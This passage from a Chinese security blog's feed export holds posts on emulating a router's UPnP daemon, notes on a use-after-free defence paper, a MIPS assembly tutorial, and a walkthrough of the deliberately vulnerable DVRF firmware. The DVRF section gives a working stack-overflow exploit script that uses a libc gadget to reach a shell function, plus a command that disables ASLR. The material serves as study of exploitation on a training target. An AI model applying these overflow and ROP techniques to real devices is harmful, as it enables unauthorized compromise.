./lib/libc.so.6</span><br></pre></td></tr></table></figure><p>可以看到这时候没有报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092109700.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092109700.png" alt="image.png"></a><br>但是这里fopen打开的文件目录显然不存在  所以自己创建目录后成功运行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092126282.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092126282.png" alt="image.png"></a><br>还需要用到nvram.ini文件 在项目中有提到<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092127111.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092127111.png" alt="image.png"></a><br>按照下面这样配置nvram.ini</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=127.0.0.1</span><br><span class="line">hwver=R6400</span><br><span class="line">friendly_name=R6400</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>随后成功运行<br>环境搭建到这里就结束了 有一点疑惑的是查看的教程还需要&#x2F;lib&#x2F;libdl.so.0 但是本人没有遇到这个报错</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>PUMM论文阅读</title>
    <link href="http://example.com/2024/09/08/pumm%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <id>http://example.com/2024/09/08/pumm%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</id>
    <published>2024-09-08T08:36:46.000Z</published>
    <updated>2024-09-19T12:50:25.816Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>以往针对UAF和double free的防御方法 所采用的办法是推迟内存重新分配的时间<br>这种解决方法存在运行时和内存开销过大的问题<br>作者提出的解决方法为  对程序进行刨析 将不同任务的代码单元分割开 这样不同单元之间的数据互通就极少  内存的重新分配可以等到单元执行完毕后  这样就有效避免了UAF<br>于是设计了一款以linux为原型的 称之为PUMM 由离线的代码分析器和在线执行器组成</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>UAF可能导致程序崩溃和拒绝服务攻击(DOS)<br>甚至有可能导致任意代码执行  攻击者可以伪造缓冲区 触发UAF使程序将该缓冲区当成原始代码指针 从而劫持程序执行流<br>原理就是程序释放了内存后 攻击者仍然保留这块内存的指针 当这块内存被重新分配时 攻击者就可以篡改目标地址的内容<br>所以研究人员一开始的防御思路是设计内存分配器 以推迟内存重新分配的时间 当攻击者无法用新的内存对象覆盖以前的内存对象 就可以避免UAF<br>近年来 出现了两种方案(扫描和一次性分配)<br>扫描方法在内存释放后 会对其进行隔离 当验证不存在对该内存仍可利用的指针后 才会重新分配<br>一次性分配(OTA)方法则是不会重新分配内存<br>这两种方法虽然可以有效防止UAF 但是扫描方法会因为误报从而过度隔离内存 一次性分配会消耗过多的虚拟内存 从而加大内存开销<br>基于EUP 作者认为可以在执行单元上实行OTA 这样执行单元在新迭代开始时就会被释放 不会出现常规OTA所造成的虚拟地址空间耗尽<br>这一方案的第一个难点在于如何在缺乏源代码的程序中识别需要延迟进行重新分配的执行单元 于是作者提出了⼀种基于离线动态分析的技术来检测一个执行单元的外循环指示<br>这里要注意  EUP采取的是运行时行为来检测单元 而作者采取的是审计日志来检测单元<br>接下来的任务就是将识别到的单元转化为有效可执行的内存分配器的隔离策略<br>作者采取了一种算法来精确的定位程序中的释放点 通过识别执行单元开始前发生的内存管理器函数的调用者 来允许单元每次新迭代开始时安全的释放之前隔离的地址</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409191108734.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409191108734.png" alt="image.png"></a><br>如图所示 提供了一个代码示例<br>该代码存在UAF漏洞 代码主体逻辑为以行为单位读取文件中的内容 如果getline函数中的realloc没有开辟成功下一行的空间 那么此时的指针r就仍然指向上一行 但是上一行的空间已经被释放了 此时就得到了一个空置指针 进行了二次free<br>PUMM如何分析这个程序 在脱机阶段 通过测试数据的输入来分析程序的执行轨迹 会显示出一张控制流图(CFG)<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409192030758.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409192030758.png" alt="image.png"></a><br>针对上面的案例  PUMM检测到了四个简单周期(基本电路) 而橙色周期的头部支配其他周期的头部 所以他们合并成一个执行单元(用紫色表示)<br>这个执行单元的头部 也就是刚才的橙色周期 也是这个执行单元的最外层循环 这是有一定联系的  我们标识的单元具备了自主处理一个输入的所有代码<br>下一步 PUMM会定位内存分配器函数的调用者 并检测是否有属于某个单元的调用者<br>PUMM将这个调用者记录在安全配置文件中 当程序到达这个调用者 就代表执行单元新的迭代开启 就不会再访问上一次迭代的内存地址 同时 上一次迭代的悬空指针都将作废<br>在任何情况下 PUMM会加载安全配置文件 内存管理器函数调用的内存地址都会被隔离 同时之前隔离的内存将会被释放<br>这种方法仍然无法避免UAF 但是UAF访问的非法地址被隔离 所以无法访问</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>2024CISCN华东南分区赛</title>
    <link href="http://example.com/2024/06/26/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <id>http://example.com/2024/06/26/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/</id>
    <published>2024-06-26T12:40:51.000Z</published>
    <updated>2024-06-26T12:43:57.487Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="cJSON"><a href="#cJSON" class="headerlink" title="cJSON"></a>cJSON</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>MIPS架构学习</title>
    <link href="http://example.com/2024/02/27/mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/02/27/mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-02-27T07:47:06.000Z</published>
    <updated>2024-10-10T02:52:20.624Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure><h1 id="编译及运行"><a href="#编译及运行" class="headerlink" title="编译及运行"></a>编译及运行</h1><p>MIPS架构 其也包括大小端序 32位和64位<br>32位小端序 mipsel<br>32位大端序 mips<br>64位小端序 mips64el<br>64位大端序 mips64<br>用如下所示代码编译一个32位小端序的二进制文件 并尝试使用qemu模拟运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdint.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    printf(&quot;%s&quot;,&quot;test\n&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mipsel-linux-gnu-gcc -o test test.c</span><br></pre></td></tr></table></figure><p>qemu模拟运行指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -L /usr/mipsel-linux-gnu/ ./test</span><br></pre></td></tr></table></figure><h1 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>这里以o32 abi接口标准为主<br>其约定的寄存器如下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402271658263.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402271658263.png" alt="image.png"></a><br>此外 MIPS架构还强制要求协处理器 最多可以拥有4个<br>固定拥有协处理器cp0<br>其功能包括CPU配置 Cache控制 异常、中断控制 中断或异常发生时的行为和处理的定义 内存管理单元控制等等<br>协处理器cp0一共包括32个寄存器 这里挑选几个比较重要的寄存器来记忆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sr 状态寄存器 可以反应cpu的状态以及控制cpu</span><br><span class="line">$lo $hi 整数乘除法寄存器 只用来存放整数乘除法运算的结果 前者存放商 后者存放余数</span><br><span class="line">$pc 程序计数器 标志着当前要执行的指令 类似于x86架构中的eip</span><br><span class="line">$f0-$f31 浮点数寄存器</span><br></pre></td></tr></table></figure><h2 id="读懂简单的程序汇编"><a href="#读懂简单的程序汇编" class="headerlink" title="读懂简单的程序汇编"></a>读懂简单的程序汇编</h2><p>这里通过上面编译出来的32位小端序程序来逐行分析汇编<br>以main函数为例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071258753.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071258753.png" alt="image.png"></a><br>addiu和addi功能相同 为左侧操作数加上右侧的立即数 不过addiu并不会检测溢出<br>$sp指向栈顶 这里抬高栈顶 为后续操作腾出栈空间<br>sw(store word)将寄存器的值保存到某地址 这里将返回地址保存到$sp+0x40+0x4处<br>下一行将栈底指针保存到$sp+0x40处<br>move指令用于寄存器值之间的传递 这里使$fp&#x3D;$sp 将栈底指针也抬高到栈顶处<br>前面这些操作类似于x64架构中的初始化栈帧空间以及保存返回地址以便返回到上一个执行语句<br>li(load immediate)将立即数赋值给寄存器 这里把0x419010传给$gp 顺带下一句把$gp的值保存到了$sp+0x40-0x30处<br>la(load address)将地址赋值给寄存器<br>lw(load word)将某地址内的值赋值给寄存器<br>__stack_chk_guard的地址也为0x4110a0 这两句组合起来就相当于将canary的值赋值给v0寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071342441.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071342441.png" alt="image.png"></a><br>接着用sw 将v0的值存储到$fp+0x40-0x4中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071356771.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071356771.png" alt="image.png"></a><br>红框圈起来的是该语句写入的canary 而你会发现 这里实际上是往$s8+0x3c处写入 而不是$fp<br>查阅了cyberangle师傅的博客后 得知对于gdb来说 对于$fp的操作就等于对于$s8操作<br>上面没提及的是 $fp是30号寄存器 根据编译器的不同 30号寄存器也可以看作是$s8<br>在介绍jal汇编指令之前 需要引入两个概念 叶子函数和非叶子函数<br><strong>叶子函数: 该函数中不会再调用其他函数</strong><br><strong>非叶子函数: 该函数中会调用其他函数</strong><br>这里以另外一个程序为例来观察二者的区别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    vuln();</span><br><span class="line">    puts(&quot;exit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了排除开启canary保护加入的stack_fail_check函数带来的影响 这里选择关闭canary保护<br>此时按照上面的理念 可以判断出main函数调用了vuln和printf属于非叶子函数 vuln函数为叶子函数<br>先来看非叶子函数main<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181918987.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181918987.png" alt="image.png"></a><br>首先 抬栈腾出栈帧空间 随后往栈上保存返回地址和栈底指针 迁移sp指针至fp指针<br>随后跳转执行vuln函数<br>再来看叶子函数vuln<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181944412.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181944412.png" alt="image.png"></a><br>可以明显看到 叶子函数并没有将$ra寄存器的值存放到栈上 这是因为非叶子函数需要调用到其他函数 所以将返回地址暂存到栈上 而叶子函数不必考虑这一点<br>那么说回到jal指令 其将对应函数的地址载入ra寄存器 随后nop滑动执行函数<br>接着以test程序的main函数来分析 看一下puts函数是如何调用的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403182025876.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403182025876.png" alt="image.png"></a><br>先把之前存到栈上的gp寄存器值重新赋值给寄存器<br>lui(load upper immediate) 取立即数存到寄存器的高16位 低16位用0填充<br>此时v0寄存器为0x00400000<br>aTest指向存放于rodata段的test字符串 此时的addiu相当于 a0&#x3D;v0+(aTest-0x400000)<br>随后将puts函数的地址存放到t9寄存器中<br>jarl和jal指令的区别在于 前者会多一个存放返回地址的功能<br>其有两种格式  jalr opt1 opt2 和jalr opt1<br>当为前者时 返回地址存入opt2 为后者时 返回地址存入ra寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221026926.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221026926.png" alt="image.png"></a><br>分析一下 像read这类需要多参数的函数如何处理<br>可以看到三个参数是用寄存器$a0-$a2存储 不同于i386架构的32位是利用栈来传参<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221035890.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221035890.png" alt="image.png"></a><br>最后来看开启了canary保护的栈帧是如何结束的<br>重点在于beq指令 如果$v1(也就是栈上的canary)和$v0相等<br>那么就跳转到loc_400920 否则调用stack_chk_fail函数来输出报错以及终止程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403281138947.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403281138947.png" alt="image.png"></a><br>栈帧末尾 清空了v0寄存器 使其为0 和i386架构类似 后者把eax寄存器用于存储函数返回值<br>随后把$sp挪到$fp所指向的地址 也就是最开始$sp抬高栈帧后的地址<br>随后取回放在栈上的$ra和$fp<br>一开始把$sp往低地址移动了0x48字节 在结束后将$sp放回去<br>随后跳转回到$ra中存储的返回地址</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>DVRF项目学习</title>
    <link href="http://example.com/2024/02/25/dvrf%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/02/25/dvrf%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-02-25T03:31:19.000Z</published>
    <updated>2024-09-07T03:24:02.930Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Damn Vulnerable Router Firmware (DVRF)是一个帮助了解x86&#x2F;64以外架构的项目 支持qemu模拟搭建环境<br>项目地址 <a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/praetorian-inc/DVRF.git</span><br></pre></td></tr></table></figure><p>下载项目后 使用binwalk分解出文件系统</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DVRF_v03.bin 该文件位于Firmware文件夹中</span><br></pre></td></tr></table></figure><p>所涉及到的漏洞文件位于pwnable文件夹中</p><h1 id="stack-bof-01"><a href="#stack-bof-01" class="headerlink" title="stack_bof_01"></a>stack_bof_01</h1><p>先来看这个文件 readelf查看架构  发现是mips<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251155344.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251155344.png" alt="image.png"></a><br>尝试使用qemu模拟运行一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot  . ./qemu-mipsel-static  ./pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251255367.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251255367.png" alt="image.png"></a><br>需要在程序后面跟上参数 随便带一个aaaa试试<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251257464.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251257464.png" alt="image.png"></a><br>应该是有一个空间存放输入的字符串 加上打印出了字符串 猜测可能存在溢出的情况 使用ida打开程序看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; // [sp+18h] [+18h] BYREF</span><br><span class="line">  char v5[198]; // [sp+1Ah] [+1Ah] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  memset(v5, 0, sizeof(v5));</span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Welcome to the first BoF exercise!\r\n\r&quot;);</span><br><span class="line">  strcpy((char *)&amp;v4, argv[1]);</span><br><span class="line">  printf(&quot;You entered %s \r\n&quot;, (const char *)&amp;v4);</span><br><span class="line">  puts(&quot;Try Again\r&quot;);</span><br><span class="line">  return 65;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析一下main函数 开始对于argc参数进行了判断 其用来表示程序外部输入参数的个数<br>初始值为1 即运行程序的指令 如果我们后续再跟入一个参数 即可以跳过if分支<br>接下来使用strcpy函数将输入的参数复制到v4数组中 没有对写入的字节数进行限制 这里就存在栈溢出<br>同时还存在dat_shell函数 通过执行该函数 可以直接获取shell<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301626746.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301626746.png" alt="image.png"></a><br>通过对mips架构的程序了解 返回地址存储在栈上 在栈帧结束后 通过$ra寄存器进行跳转<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301635598.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301635598.png" alt="image.png"></a><br>比对strcpy函数和最后的$ra寄存器值 大致可以推测出偏移为0xcc 准备利用动调来测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $v0, $fp, 0xE0+var_C8</span><br><span class="line"></span><br><span class="line">lw      $ra, 0xE0+var_s4($sp)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot  . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure><p>可以看到偏移就为0xcc 此时我们在垃圾数据后加上漏洞函数的地址 看是否能够劫持程序执行流<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301643411.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301643411.png" alt="image.png"></a><br>编写exp脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0xcc + &#x27;\x50&#x27;+&#x27;\\&#x27;+&#x27;\x09\x40&#x27;</span><br><span class="line"></span><br><span class="line">io = process(&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 2222 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)</span><br><span class="line">elf = ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>虽然此时已经劫持了返回地址 但是会发现程序卡在了这句<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301756554.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301756554.png" alt="image.png"></a><br>查阅了其他师傅的博客后 发现问题出在了t9这个寄存器上<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301757914.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301757914.png" alt="image.png"></a><br>如图 dal_shell函数中调用的每个函数的参数都由$t9来索引 为了成功调用函数<br>我们还需要控制t9的值 t9的值默认为当前函数开始的地址<br>接下来的问题在于如何控制t9寄存器<br>利用ropper查询一下gadget 漏洞文件中未发现 查看一下libc文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ropper -f libc.so.0 --search &quot;lw $t9&quot;</span><br></pre></td></tr></table></figure><p>以sp寄存器为索引的地址相对来说更好控制 可以在栈溢出的时候顺便设置 这里的两句都可以使用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072114740.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072114740.png" alt="image.png"></a><br>随后关闭aslr 来减小我们做题的难度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>但是在查询libc基址的时候发现  vmmap无法显示出来地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072257376.png" title="e59c768b79190538edb1c9f4ab494194.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072257376.png" alt="e59c768b79190538edb1c9f4ab494194.png"></a><br>于是打算利用memset中的got表来获取真实地址<br>断点打在执行memset函数后<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171355050.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171355050.png" alt="image.png"></a><br>得到memset的真实地址 打开libc文件 查得偏移为0x1BE10<br>计算得到libc基址<br>那么就可以得到lw $t9该条gadget的地址了<br>往对应的位置填入后门函数的起始地址赋值给$t9 成功执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171400209.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171400209.png" alt="image.png"></a><br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = 0x3fee5000</span><br><span class="line">t9 = 0x00021278+libc_base #0x3ff11ff4</span><br><span class="line"></span><br><span class="line">#payload = &quot;a&quot;*0xcc + &#x27;\xf4\x1f\xf1\x3f&#x27; + &#x27;\x50&#x27;+&#x27;\\&#x27;+&#x27;\x09\x40&#x27;</span><br><span class="line">payload = b&quot;a&quot;*0xcc + p32(t9)+b&#x27;\x50&#x27;+b&#x27;\\&#x27;+b&#x27;\x09\x40&#x27;+cyclic(0x3d)+b&#x27;\x50&#x27;+b&#x27;\\&#x27;+b&#x27;\x09\x40&#x27;</span><br><span class="line"></span><br><span class="line">io = process(b&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 1111 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)</span><br><span class="line">elf = ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h1><p>32位小端序mips架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171406868.png" title="image.png" class="gallery-item"><img 